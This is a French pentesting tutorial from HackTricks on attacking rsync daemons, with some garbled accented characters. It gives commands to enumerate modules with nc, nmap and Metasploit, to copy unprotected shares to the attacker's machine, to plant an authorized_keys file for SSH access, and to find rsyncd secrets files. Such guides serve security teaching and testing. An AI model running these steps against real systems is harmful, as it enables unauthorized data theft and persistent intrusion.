# 873 - Pentesting Rsync

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou souhaitez-vous accÃ©der Ã  la **derniÃ¨re version du PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* DÃ©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dÃ©pÃ´t hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dÃ©pÃ´t hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

> **rsync** est un utilitaire permettant de [transfÃ©rer](https://en.wikipedia.org/wiki/File\_transfer) et de [synchroniser](https://en.wikipedia.org/wiki/File\_synchronization) efficacement des [fichiers](https://en.wikipedia.org/wiki/Computer\_file) entre un ordinateur et un disque dur externe et Ã  travers des [ordinateurs en rÃ©seau](https://en.wikipedia.org/wiki/Computer\_network) en comparant les [heures de modification](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) et les tailles des fichiers.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) Il est couramment trouvÃ© sur les [systÃ¨mes d'exploitation de type Unix](https://en.wikipedia.org/wiki/Unix-like). L'algorithme rsync est un type de [codage delta](https://en.wikipedia.org/wiki/Delta\_encoding), et est utilisÃ© pour minimiser l'utilisation du rÃ©seau. [Zlib](https://en.wikipedia.org/wiki/Zlib) peut Ãªtre utilisÃ© pour une [compression de donnÃ©es](https://en.wikipedia.org/wiki/Data\_compression) supplÃ©mentaire,[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) et [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) ou [stunnel](https://en.wikipedia.org/wiki/Stunnel) peuvent Ãªtre utilisÃ©s pour la sÃ©curitÃ©.

D'aprÃ¨s [wikipedia](https://en.wikipedia.org/wiki/Rsync).

**Port par dÃ©faut :** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Ã‰numÃ©ration

### BanniÃ¨re & Communication manuelle
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Ã‰numÃ©ration des dossiers partagÃ©s**

**Un module rsync est essentiellement un partage de rÃ©pertoire**. Ces modules **peuvent Ã©ventuellement Ãªtre protÃ©gÃ©s par un mot de passe**. Cette option liste les modules disponibles et, Ã©ventuellement, dÃ©termine si le module nÃ©cessite un mot de passe pour l'accÃ¨s :
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Notez qu'il pourrait Ãªtre configurÃ© un nom partagÃ© pour ne pas Ãªtre listÃ©. Il pourrait donc y avoir quelque chose de **cachÃ©**.
Notez qu'il peut y avoir des **noms partagÃ©s** listÃ©s pour lesquels vous avez besoin de certains **identifiants** (diffÃ©rents) pour accÃ©der. Ainsi, tous les noms listÃ©s ne seront pas toujours accessibles et vous le remarquerez si vous recevez un message _**"AccÃ¨s refusÃ©"**_ lors de la tentative d'accÃ¨s Ã  certains d'entre eux.

### [**Force brute**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Rsync manuel

Une fois que vous avez la **liste des modules**, vous avez plusieurs options diffÃ©rentes en fonction des actions que vous souhaitez entreprendre et si une authentification est requise ou non. **Si l'authentification n'est pas requise**, vous pouvez **lister** un dossier partagÃ© :
```bash
rsync -av --list-only rsync://192.168.0.123/shared_name
```
Et **copiez** tous les **fichiers** sur votre machine locale via la commande suivante :
```bash
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Ce **transfÃ¨re rÃ©cursivement tous les fichiers du rÃ©pertoire** `<shared_name>` sur la machine `<IP>` dans le rÃ©pertoire `./rsync_shared` sur la machine locale. Les fichiers sont transfÃ©rÃ©s en mode "archive", ce qui garantit que les liens symboliques, les pÃ©riphÃ©riques, les attributs, les permissions, les propriÃ©tÃ©s, etc. sont prÃ©servÃ©s lors du transfert.

Si vous **avez des identifiants**, vous pouvez **lister/tÃ©lÃ©charger** un **nom partagÃ©** en utilisant (le mot de passe sera demandÃ©) :
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Vous pourriez Ã©galement **tÃ©lÃ©verser** du **contenu** en utilisant rsync (par exemple, dans ce cas, nous pouvons tÃ©lÃ©verser un fichier _**authorized\_keys**_ pour obtenir l'accÃ¨s Ã  la machine) :
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Trouvez le fichier de configuration rsyncd :
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
Dans le fichier de configuration, il est parfois possible de trouver le paramÃ¨tre _secrets file = /chemin/vers/fichier_ et ce fichier peut contenir des noms d'utilisateur et des mots de passe autorisÃ©s Ã  s'authentifier sur rsyncd.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersÃ©curitÃ©** ? Vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ? ou souhaitez-vous accÃ©der Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* DÃ©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dÃ©pÃ´t hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dÃ©pÃ´t hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
